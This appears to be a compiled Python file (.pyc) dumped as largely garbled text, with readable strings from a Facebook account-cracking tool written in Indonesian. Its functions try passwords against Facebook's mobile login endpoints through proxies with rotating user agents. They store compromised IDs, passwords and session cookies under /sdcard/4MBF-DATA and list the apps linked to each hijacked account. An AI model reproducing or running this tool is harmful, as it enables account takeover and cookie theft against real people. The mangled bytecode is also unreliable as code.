?r  c                 C   s?  t j?d?g d?t? ?d?t? ?d?t? ?d?t? ?d?t? ?t? ?t? ?d?|? ?tt	?? ?t? ?d?t? ?d?t
? ?t? ?t? ?d?t? ?d?t? ?t? ?t? ?d?t? ?d	?tttt	?? ?? ?t? ?d
???f t j??  t?t?}t?t?}t?? }|D ?]9}?z%|j?dddd|dddddd?
? |?d|  d ?}t?dt|j??? d?t?dt|j??? d?| dd|d?}d?dd? |j!?"? ?#? D ??}|d 7 }i d!d?d"d?d#d$?d%d?d&d'?d(d?d)d*?d+d,?d-|?d.d?d/d0?d1d?d2d?d3d?d4d|  d ?d5d6?d7d8?d9d:i?}	|j$d;|d<|i|	d=t%d>?}
d?|
j!?"? ?&? v ?rXt'd@t(? dA| ? dB|? t)? ?? t*?+dC? t,dDt- dE??| dB | dF ? t.?/| dB | ? td7 aW  nddG|j!?"? ?&? v ?r?td7 a|
j!?"? }d?dHd? |j!?"? ?#? D ??}t'd@t
? dA| ? dB|? dB|? t)? ?	? t*?+dI? t,dJt0 dE??| dB | dF ? t1t2|? W  nW q? tj3j4?y?   t5?6dK? Y q?w td7 ad S )LNrx   u   ðŸ”¥ r?   ZMbasicr?   r;   r(  r)  r*  r+  zfree.facebook.comr?   r.  rR   r/  r0  r1  r2  r?   r3  z;https://free.facebook.com/login/device-based/password/?uid=?)&flow=login_no_pin&refsrc=deprecated&_rdrr:  r   r;  z,https://free.facebook.com/login/save-device/r<  r=  rA  c                 S   rB  rC  rL   rD  rL   rL   rM   rH    rI  zcrackfree.<locals>.<listcomp>rJ  r4  r?   rK  rL  r5  rM  rN  r?   r?   zhttps://free.facebook.comr?   rO  r?   r?   rP  rQ  r6  r7  r8  r?   rR  rS  r?   z#ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7?
connection?closezFhttps://free.facebook.com/login/device-based/validate-password/?shbl=0r|   FrT  rW  r?   z>> r?   rX  r?   rJ   r<   rY  c                 S   rB  rC  rL   rD  rL   rL   rM   rH    rI  rZ  r?   r?   )7ra   rb   rH   rq   r+   r?   r?   r[  r?   rv   r#   r#  r?   r$  r?   r?   r\  r]  rc   r?   r?   r@   r^  rB   r?   r?   r?   rC   rE   r?   rG   rD   r?   r~   r`  ra  rb  rk  rc  r   r&   r)   rj   rd  r=   r  re  rA   r  rf  rg  r?   r?   rd   re   )r&  r'  r?   rI   rh  r?   ri  rl  rm  rn  ro  rp  rq  rL   rL   rM   r     sF   ?



":z
 
$
 
?r   c           !      C   ?  t ?ttttttg?}td t	t
? }d}t ?t?}dd| i}t ?t?}t ?t?}t?? }	tj?d|tt	t
?ttt|?t|?tf ? tj??  |D ?]1}
?z|	j?dddd	|d
ddddd?
? |	?d|  d ?}t?dt|j???d?t?dt|j???d?| dd|
d?}d? dd? |j!?"? ?#? D ??}|d7 }i dd?dd?dd?d d?d!d"?d#d	?d$d%?d&d'?d(|?d)d
?d*d+?d,d?d-d?d.d?d/d|  d ?d0d1?d2d3?d4d5i?}|	j$d6|d7|i|d8|d9?}d:|j!?"? ?%? v ?rEd;t&v ?rt'?(| d< |
 ? t)| |
? n?d;t*v ?r?t+d=? d>| ? d?|
? ?}t,|d@dA?}t-t,|dBdC?? t.dDt/ dE??| d< |
 d= ? t'?(| d< |
 ? td7 anW qKW  ?n9dF|	j!?"? ?%? v ?rid(dGi}dHt0v ?r?|j!?"? }d? dId? |	j!?"? ?#? D ??}t.dJt1 dE??| d< |
 d< | d= ? t+d=? d>| ? dK|
? dL|? ?}t,|dMdA?}t-t,|dNdC?? td7 aW  n?d;t0v ?rh|j!?"? }d? dOd? |	j!?"? ?#? D ??}t.dJt1 dE??| d< |
 d< | d= ? | }dP}t?? }|jdQ||dR?j}|jdS||dR?j}|dT7 }t?2dUt|??}d}|D ]}|dV|? dW|dX ? dY|d ? dZ?7 }|d7 }?q?dX}|d[7 }t?2dUt|??} dX}| D ]}|d7 }|d\|? dW|dX ? dY|d ? d]?7 }?q't+d=? d^| ? dK|
? dL|? d_|? ?}t,|dMdA?}t-t,|d`dC?? td7 aW  nnW qKW qK tj3j4?y}   t5?6da? Y qKw td7 ad S )bNr   ?%r,  ?	socks5://??   %s â˜¬ %s/%s â˜¬ OK:%s â˜¬ CP:%s â˜¬ %s%s%s â˜¬ztouch.facebook.comr?   r.  rR   r/  r0  r1  r2  r?   r3  z<https://touch.facebook.com/login/device-based/password/?uid=rr  r:  r   r;  z-https://touch.facebook.com/login/save-device/r<  r=  rA  c                 S   rB  rC  rL   rD  rL   rL   rM   rH  ;  rI  zcracktouch.<locals>.<listcomp>rJ  r4  r?   rK  rL  r5  rM  rN  r?   r?   zhttps://touch.facebook.comr?   rO  r?   r?   rP  rQ  r6  r7  r8  r?   rR  rS  r?   ?#fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7rs  rt  zGhttps://touch.facebook.com/login/device-based/validate-password/?shbl=0r|   FrT  rW  r  r?   r<   ?   [â€¢] ID       : ?    [â€¢] PASSWORD : r   r?   ?AOREC-XD CP?r?   ?/sdcard/4MBF-DATA/CP/rJ   rY  ??SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]r	  c                 S   rB  rC  rL   rD  rL   rL   rM   rH  Q  rI  ?/sdcard/4MBF-DATA/OK/?   
[â€¢] PASSWORD : ?   
[â€¢] COOKIES  : r?   zAOREC-XD OKc                 S   rB  rC  rL   rD  rL   rL   rM   rH  [  rI  rx   ?>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive?r~   r?   ?<https://mbasic.facebook.com/settings/apps/tabbed/?tab=active?>   
[bold cyan][â€¢] LIST ACTIVE APPLICATIONS :[/bold cyan] 
?`</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>?[bold cyan][r?   r   r   ?[/bold cyan]
?B   
[bold yellow][â€¢] LIST EXPIRED APPLICATIONS :[/bold yellow]
?[bold yellow][?[/bold yellow]
?!   [bold green][â€¢] ID       : ?[/bold green]
?$[bold green]AOREC-XD OK[/bold green]r?   ?7r?   r?   rf   r?   ?kkr?   r?   r?   r[  r?   r  r_  r@   r^  rB   r?   ra   rb   rH   r#  r$  r?   rG   r?   rc   r?   r?   rC   rE   r?   rD   r?   rq   r~   r`  ra  rb  rc  ?oprekre  rA   ?ceker?princpr   r?   r?   r=   r  r  r  rF   r?   r?   rd   re   ?!r&  r'  ?biZpersZfffrj  rk  rI   rh  r?   ri  r?   rl  rm  rn  ro  ZstatuscpZ	statuscp1Zheadapprp  rq  ZstatusokZ	statusok1?userZinfoakunrg  Zcek2?cekZapkaktifZnokZmuncul?hitZapkexprL   rL   rM   r!  +  s?   


6
":z

 


(

($(? ?!?r!  c           !      C   ru  )bNr   rv  r,  rw  rx  r-  r?   r.  rR   r/  r0  r1  r2  r?   r3  r9  rr  r:  r   r;  z.https://mbasic.facebook.com/login/save-device/r<  r=  rA  c                 S   rB  rC  rL   rD  rL   rL   rM   rH  ?  rI  zcrackmbasic.<locals>.<listcomp>rJ  r4  r?   rK  rL  r5  rM  rN  r?   r?   r?   r?   rO  r?   r?   rP  rQ  r6  r7  r8  r?   rR  rS  r?   ry  rs  rt  zHhttps://mbasic.facebook.com/login/device-based/validate-password/?shbl=0r|   FrT  rW  r  r?   r<   rz  r{  r   r?   r|  r}  r~  rJ   rY  r  r	  c                 S   rB  rC  rL   rD  rL   rL   rM   rH  ?  rI  r?  r?  r?  r?   r?   c                 S   rB  rC  rL   rD  rL   rL   rM   rH  ?  rI  rx   r?  r?  r?  r?  r?  r?  r?   r   r   r?  r?  r?  r?  r?  r?  r?  r?   r?  r?  rL   rL   rM   r"  ~  s?   


6
":z

 


(

($(???r"  c                 C   s?  d}ddddd|ddd	d
dddddd?}t ?? }z?|?d?}t|jd| |dd?|dd?jd?}|?d?}i }g d?}	|d?D ]}
|
?d?|	v rT|?|
?d?|
?d?i? q>t|jdt|d ? ||d?jd?}t	dt
| |tf ? tdt d ??| d! | d" ? td#7 a|?d$?}t|?d%kr?t	d&ttf ? W d S |D ]}t	d't|jtf ? q?W d S  ty? } z-t	dt
| |tf ? t	d(ttf ? tdt d ??| d! | d" ? td#7 aW Y d }~d S d }~ww ))Nz?Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]r-  r?   rR   r?   rO  ?|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9?mark.via.gpr0  ?navigater.  ?document?:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8?gzip, deflater?   ?r4  r?   r?   r?   r?   r?   r?   rP  r6  r7  zsec-fetch-userr8  r?   rR  r?   ?%https://mbasic.facebook.com/login.phpr  ??emailr@  rl   T?r?   r?   rU  r?   ?form?Znhr>  Zfb_dtsgzsubmit[Continue]Zcheckpoint_datar?   rs   rG  ?action?r?   r?   ?%s++++ %s|%s ----> CP       %sr?   rJ   r?   r<   r   ?optionr   ?2%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)?%s---> %s%sz>%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s)rB   r?   rC   ?soprb  rD   r?   r?   rG   r   r?   r?   r=   r  rH   r$  r?   r?   r?   r?  r?   rf   )r&  ri  rI   ?headr?   ?hi?ho?jor?   ?lion?anj?kent?opsi?opsii?crL   rL   rM   r?  ?  s<   $
"
?$ 
? ??r?  c                  C   s$  t t?} d|  }tt|dd?? ttd t d t d ? d}t? ?t	|dd	?? d
}tD ?]Q}?z/z|?
d?d
 |?
d?d }}W n  tyd   t?d? tdt|tf ? tdttf ? Y W q.w t?ttttttg?}td||t t?|tf dd? tj??  d}t?? }	ddddd|dddddddd d!d"?}
|	?d?}t|	jd#||d$d%?|
d&d'?jd(?}d)|	j?? ? ? v ?r=zi|?!d*?}i }g d+?}|d,?D ]}|?d-?|v r?|?"|?d-?|?d.?i? q?t|	jdt#|d/ ? ||
d0?jd(?}td1t||tf ? |?$d2?}t |?d
k?rtd3ttf ? n|D ]}td4t|jtf ? ?qW n6   td1t||tf ? td5ttf ? Y nd6|	j?? ? ? v ?rRtd7t||tf ? n
td1t||tf ? |d7 }W q. tj%j&?y?   td8? d9}t? ?t	|d:d	?? t'?  Y q.w d;}t? ?t	|dd	?? t'?  d S )<NzWTerdapat %s Akun Untuk Dicek
Sebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih DahuluzCEK OPSIr}  r?   r?   z] Mulaiz# PROSES CEK OPSI DIMULAIr?   r?   r   r?   r   r?   z%s++++ %s ----> Error      %sz2%s---> Pemisah Tidak Didukung Untuk Program Ini%sz%s---> %s/%s ---> { %s }%sr   r?   z{Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36r-  r?   rR   r?   rO  r?  r?  r0  r?  r.  r?  r?  r?  r?   r?  r?  r  r?  Tr?  r?   rW  r?  r?  r?   rs   rG  r?  r?  r?  r?  r?  r?  z#%s---> Tidak Dapat Mengecek Opsi%srY  z%s++++ %s|%s ----> OK       %srx   z2# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGIr   z# DONE)(r?   re  r?   r?   r?   r?   r?   r?   r   r?   r?   ?
IndexErrorrd   re   r?   rf   r?   r?   r?   r?  r?   ra   rb   rc   rB   r?   rC   r?  rb  rD   r~   r`  rc  r?   r?   rG   r?   r?   r?   rr   )r?  r  r?  ZloveZkesrv   ri  r?  rI   r?   ?headerr?  r?  r?  r?   r?  r?  r?  r?  r?  r?   ZdahrL   rL   rM   ?cek_opsi?  sr   
"
?($
"
?$
?
?
r?  c              	   C   sF  | j dd|id?j}t|d?}|jddd?}dd	? |?d
?D ?}t|?dkr5tdt? dt? dt? d?? nt	t|??D ]}tdt
|d || ?dd?tf ? q;| j dd|id?j}t|d?}|jddd?}dd	? |?d
?D ?}t|?dkr?tdt? dt? dt? d?? d S t	t|??D ]}tdt|d || ?dd?tf ? q?d S )Nr?  r|   r}   r?   r?  rb  )r  c                 S   ?   g | ]}|j ?qS rL   ?rD   ?rE  ?irL   rL   rM   rH  *  ?    zcek_apk.<locals>.<listcomp>Zh3r   z
 r?   ?!z-] opshh tidak ada aplikasi aktif di akun ini.z   %s%s. %s%sr   zDitambahkan padaz Ditambahkan padar?  c                 S   r?  rL   r?  r?  rL   rL   rM   rH  3  r?  z2] opshh tidak ada aplikasi kadaluarsa di akun ini.ZKedaluwarsaz Kedaluwarsa)rC   rD   r   r?   r?   r?   r   r)   r(   r?   r#   r?   r&   )rg  r|   r   r?  r?   Zgamer?  rL   rL   rM   rf  &  s"   
&
 &?rf  ?__main__zgit pullzLDK-OKzLDK-CPr  ztouch .prox.txt)?rB   Zbs4r?   rj   ra   r?   ?datetimerd   rE   ?urllib3Zrich?base64Z
rich.tabler   ?meZrich.consoler   r?   r   r?  Zconcurrent.futuresr   r  r   ZgpZ
rich.panelr   r?   r   r?   Zrich.markdownr	   r?   Zrich.columnsr
   r?   Zrprintr   Z	rich.textr   ZtekzZinstall?CONr^  r@   Zcokbrutr?   r?   r?  rC   rD   r_  r=   rH   r?   rg   r>   r?   r?   ZxdrJ   ?	randranger?   r?  ?d?fr?   r?   r?  ?jr?   rN   rA   rK   r?   ?lZuaku2r?   Zuakrv   r  r[  r#  r$  re  r?  r  Z	lisensikur  r?   r?   Zlisensikunir  r  r+   r(   r#   r&   r   r0   r*   r)   r5   Zsirr?   r?   rf   r?  r?   r?   ZdicZdic2?now?dayZtglrG   ?monthZbln?yearZthnr  r  rh   ri   rm   rt   ry   rl   r?   r?   r?   r?   r?   r?   r?   r?   r?   r?   r?   r?   r  r  r   r!  r"  r?  r?  rf  ?__name__rk   ?mkdirrL   rL   rL   rM   ?<module>   s  H??<
B>8
(( 'b/(A)?P*(SQ9

?